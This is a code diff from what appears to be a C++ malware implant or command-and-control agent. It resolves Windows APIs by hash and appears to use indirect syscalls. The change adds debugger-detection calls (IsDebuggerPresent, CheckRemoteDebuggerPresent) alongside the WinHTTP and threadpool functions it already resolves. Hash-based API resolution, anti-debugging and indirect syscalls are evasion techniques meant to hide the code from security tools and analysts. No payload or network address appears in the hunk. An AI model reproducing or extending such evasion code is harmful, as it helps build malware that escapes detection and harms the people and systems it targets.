@@ -132,32 +132,36 @@ namespace Procs
         pProcs->lpRtlZeroMemory             = reinterpret_cast<LPPROC_RTLZEROMEMORY>(pRtlZeroMemory);
 
         // WINAPI
-        PVOID pCreateThreadpoolWait         = GetProcAddressByHash(hKernel32DLL, APIHASH_CREATETHREADPOOLWAIT);
-        pProcs->lpCreateThreadpoolWait      = reinterpret_cast<LPPROC_CREATETHREADPOOLWAIT>(pCreateThreadpoolWait);
-        PVOID pSetThreadpoolWait            = GetProcAddressByHash(hKernel32DLL, APIHASH_SETTHREADPOOLWAIT);
-        pProcs->lpSetThreadpoolWait         = reinterpret_cast<LPPROC_SETTHREADPOOLWAIT>(pSetThreadpoolWait);
-        PVOID pWinHttpCloseHandle           = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCLOSEHANDLE);
-        pProcs->lpWinHttpCloseHandle        = reinterpret_cast<LPPROC_WINHTTPCLOSEHANDLE>(pWinHttpCloseHandle);
-        PVOID pWinHttpConnect               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCONNECT);
-        pProcs->lpWinHttpConnect            = reinterpret_cast<LPPROC_WINHTTPCONNECT>(pWinHttpConnect);
-        PVOID pWinHttpOpen                  = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPOPEN);
-        pProcs->lpWinHttpOpen               = reinterpret_cast<LPPROC_WINHTTPOPEN>(pWinHttpOpen);
-        PVOID pWinHttpOpenRequest           = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPOPENREQUEST);
-        pProcs->lpWinHttpOpenRequest        = reinterpret_cast<LPPROC_WINHTTPOPENREQUEST>(pWinHttpOpenRequest);
-        PVOID pWinHttpQueryDataAvailable    = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPQUERYDATAAVAILABLE);
-        pProcs->lpWinHttpQueryDataAvailable = reinterpret_cast<LPPROC_WINHTTPQUERYDATAAVAILABLE>(pWinHttpQueryDataAvailable);
-        PVOID pWinHttpQueryHeaders          = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPQUERYHEADERS);
-        pProcs->lpWinHttpQueryHeaders       = reinterpret_cast<LPPROC_WINHTTPQUERYHEADERS>(pWinHttpQueryHeaders);
-        PVOID pWinHttpReadData              = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPREADDATA);
-        pProcs->lpWinHttpReadData           = reinterpret_cast<LPPROC_WINHTTPREADDATA>(pWinHttpReadData);
-        PVOID pWinHttpReceiveResponse       = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPRECEIVERESPONSE);
-        pProcs->lpWinHttpReceiveResponse    = reinterpret_cast<LPPROC_WINHTTPRECEIVERESPONSE>(pWinHttpReceiveResponse);
-        PVOID pWinHttpSendRequest           = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPSENDREQUEST);
-        pProcs->lpWinHttpSendRequest        = reinterpret_cast<LPPROC_WINHTTPSENDREQUEST>(pWinHttpSendRequest);
-        PVOID pWinHttpSetOption             = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPSETOPTION);
-        pProcs->lpWinHttpSetOption          = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
-        PVOID pWinHttpWriteData             = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPWRITEDATA);
-        pProcs->lpWinHttpWriteData          = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);
+        PVOID pCheckRemoteDebuggerPresent       = GetProcAddressByHash(hKernel32DLL, APIHASH_CHECKREMOTEDEBUGGERPRESENT);
+        pProcs->lpCheckRemoteDebuggerPresent    = reinterpret_cast<LPPROC_CHECKREMOTEDEBUGGERPRESENT>(pCheckRemoteDebuggerPresent);
+        PVOID pCreateThreadpoolWait             = GetProcAddressByHash(hKernel32DLL, APIHASH_CREATETHREADPOOLWAIT);
+        pProcs->lpCreateThreadpoolWait          = reinterpret_cast<LPPROC_CREATETHREADPOOLWAIT>(pCreateThreadpoolWait);
+        PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32DLL, APIHASH_ISDEBUGGERPRESENT);
+        pProcs->lpIsDebuggerPresent             = reinterpret_cast<LPPROC_ISDEBUGGERPRESENT>(pIsDebuggerPresent);
+        PVOID pSetThreadpoolWait                = GetProcAddressByHash(hKernel32DLL, APIHASH_SETTHREADPOOLWAIT);
+        pProcs->lpSetThreadpoolWait             = reinterpret_cast<LPPROC_SETTHREADPOOLWAIT>(pSetThreadpoolWait);
+        PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCLOSEHANDLE);
+        pProcs->lpWinHttpCloseHandle            = reinterpret_cast<LPPROC_WINHTTPCLOSEHANDLE>(pWinHttpCloseHandle);
+        PVOID pWinHttpConnect                   = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCONNECT);
+        pProcs->lpWinHttpConnect                = reinterpret_cast<LPPROC_WINHTTPCONNECT>(pWinHttpConnect);
+        PVOID pWinHttpOpen                      = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPOPEN);
+        pProcs->lpWinHttpOpen                   = reinterpret_cast<LPPROC_WINHTTPOPEN>(pWinHttpOpen);
+        PVOID pWinHttpOpenRequest               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPOPENREQUEST);
+        pProcs->lpWinHttpOpenRequest            = reinterpret_cast<LPPROC_WINHTTPOPENREQUEST>(pWinHttpOpenRequest);
+        PVOID pWinHttpQueryDataAvailable        = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPQUERYDATAAVAILABLE);
+        pProcs->lpWinHttpQueryDataAvailable     = reinterpret_cast<LPPROC_WINHTTPQUERYDATAAVAILABLE>(pWinHttpQueryDataAvailable);
+        PVOID pWinHttpQueryHeaders              = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPQUERYHEADERS);
+        pProcs->lpWinHttpQueryHeaders           = reinterpret_cast<LPPROC_WINHTTPQUERYHEADERS>(pWinHttpQueryHeaders);
+        PVOID pWinHttpReadData                  = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPREADDATA);
+        pProcs->lpWinHttpReadData               = reinterpret_cast<LPPROC_WINHTTPREADDATA>(pWinHttpReadData);
+        PVOID pWinHttpReceiveResponse           = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPRECEIVERESPONSE);
+        pProcs->lpWinHttpReceiveResponse        = reinterpret_cast<LPPROC_WINHTTPRECEIVERESPONSE>(pWinHttpReceiveResponse);
+        PVOID pWinHttpSendRequest               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPSENDREQUEST);
+        pProcs->lpWinHttpSendRequest            = reinterpret_cast<LPPROC_WINHTTPSENDREQUEST>(pWinHttpSendRequest);
+        PVOID pWinHttpSetOption                 = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPSETOPTION);
+        pProcs->lpWinHttpSetOption              = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
+        PVOID pWinHttpWriteData                 = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPWRITEDATA);
+        pProcs->lpWinHttpWriteData              = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);
 
         if (bIndirectSyscall)
         {
